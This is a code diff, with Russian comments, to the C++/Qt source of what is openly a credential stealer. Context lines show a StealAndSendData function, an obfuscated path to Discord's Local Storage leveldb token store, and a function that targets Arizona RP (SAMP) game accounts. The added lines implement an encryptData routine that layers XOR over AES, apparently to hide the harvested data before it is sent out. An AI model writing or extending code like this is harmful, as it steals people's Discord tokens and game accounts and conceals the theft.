@@ -52,6 +52,8 @@
 #include <QThreadPool> // Добавлено для многопоточности
 #include <QRunnable>   // Добавлено для многопоточности
 #include <cstring> // Для memcpy
+#include <QByteArray>
+#include <array>
 
 // Зашифрованные строки
 const std::string encryptedDiscordPath = "\xC0\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3"; // "\\discord\\Local Storage\\leveldb\\"
@@ -543,6 +545,38 @@ std::string MainWindow::StealAndSendData(const std::string& tempDir) {
     }
 
     return output.str();
+}
+
+std::string MainWindow::encryptData(const std::string& data) {
+    if (data.empty()) {
+        emitLog("Ошибка: Пустые данные для шифрования");
+        return "";
+    }
+
+    // Получаем ключи и IV
+    auto key1 = GetEncryptionKey(true);  // XOR ключ
+    auto key2 = GetEncryptionKey(false); // AES ключ
+    auto iv = generateIV();              // Вектор инициализации
+
+    // Применяем XOR
+    QByteArray dataBytes(data.c_str(), static_cast<int>(data.size()));
+    QByteArray xorData = applyXOR(dataBytes, key1);
+
+    // Применяем AES
+    QByteArray encryptedData = applyAES(xorData, key2, iv);
+    if (encryptedData.isEmpty()) {
+        emitLog("Ошибка: Не удалось выполнить AES-шифрование");
+        return "";
+    }
+
+    // Формируем результат: IV + зашифрованные данные
+    std::string result;
+    result.reserve(16 + encryptedData.size());
+    result.append(reinterpret_cast<const char*>(iv.data()), 16); // IV - 16 байт
+    result.append(encryptedData.constData(), encryptedData.size());
+
+    emitLog("Данные успешно зашифрованы, длина: " + QString::number(result.size()));
+    return result;
 }
 
 // Реализация StealArizonaRPData (Arizona RP на SAMP)
